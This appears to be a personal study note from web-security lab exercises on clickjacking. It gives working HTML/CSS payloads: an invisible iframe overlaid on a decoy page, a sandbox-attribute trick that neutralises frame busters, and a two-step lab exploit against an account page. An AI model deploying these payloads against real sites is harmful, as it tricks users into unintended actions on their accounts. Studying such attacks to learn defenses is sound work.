
Click jacking is an interface based attack in which a user is tricked into clicking an actionable content on a hidden website by clicking on some other content in a decoy website

the technique depends upon iframe. the iframe is overlaid on top of the user's decoy web page content.

``` HTML

<head> 
<style> 
	#target_website {
	position:relative;
	width:128px;
	height:128px;
	opacity:0.00001;
	z-index:2;
	}
	#decoy_website { 
	position:absolute;
	width:300px;
	height:400px;
	z-index:1;
	}
</style>
</head>
...
<body>
	<div id="decoy_website"> 
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>`


```


An effective attacker workaround against frame busters is to use the HTML5 iframe `sandbox` attribute. When this is set with the `allow-forms` or `allow-scripts` values and the `allow-top-navigation` value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:

`<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>`

Both the `allow-forms` and `allow-scripts` values permit the specified actions within the iframe but top-level navigation is disabled.




# Multistep clickjacking


Nothing really much to explain the lab is basically 2 steps hence we place 2 divs 



```JS
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
   .firstClick, .secondClick {
        position:absolute;
        top:500px;
        left:50px;
        z-index: 1;
    }
   .secondClick {
        top:290px;
        left:225px;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0aee00210464511f801a9e9d00a600d2.web-security-academy.net/my-account"></iframe>
```